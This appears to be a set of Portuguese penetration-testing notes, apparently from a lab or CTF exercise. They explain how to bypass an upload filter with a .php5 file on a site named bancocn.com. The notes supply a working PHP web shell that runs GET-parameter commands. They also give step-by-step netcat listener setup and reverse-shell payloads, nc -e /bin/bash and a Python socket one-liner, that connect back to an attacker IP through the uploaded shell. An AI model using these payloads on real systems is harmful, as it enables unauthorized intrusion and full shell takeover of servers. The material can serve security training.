> Foram testadas varias formas para tentar subir um ficheiro executavel. Passou pelo filtro um fichero .php5, que é executavel...

- Criar um ficheiro php5
```php
<?php
    echo shell_exec($_GET['comando']);
?>
```

- Shell Reversa
1. Saber o ip local
2. Abrir as portas do router
    - Saber qual é o touter (Gateway). Se estiver o sistema virtualizado deve-se colocar a placa de rede em modo Bridged.
    ```sh
    route -n
    ```
    - Criar um "Virtual Servers" foi usada a porta 666
    - Testar se o serviço esta _OK_

        -  ``` canyouseeme.org ```
    
        ```sh
        # iniciar o serviço
        nc -lvp 666
        ```
    - subir o arquivo cmd.php5
        - Testar se esta a conetar
        ```sh
            # No terminal - iniciar a escuta
            nc -lvp 666
        ```

        ``` bancocn.com/admin/uploads/cmd.php5?comando=nc 191.54.160.237 666 (este ip é um exemplo e porta também)```

        - para ter acesso a bash do servidor - não vai funcionar pois os servidor por norma não instalam a opção -e por motivos de segurança
        ``` bancocn.com/admin/uploads/cmd.php5?comando=nc -e /bin/bash 191.54.160.237 666 ``` 

        - Pesquisar por __reverse shell__: 
        ```http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet```

            - Usou-se o codigo em python - mudar o ip e a porta
            ```py
            python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("191.54.160.237", 666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
            ```
        - Voltar iniciar o serviço de escuta:
        ```sh
            # No terminal - iniciar a escuta
            nc -lvp 666
        ```
        - No browser:
        ```bancocn.com/admin/uploads/cmd.php5?comando=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("191.54.160.237", 666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```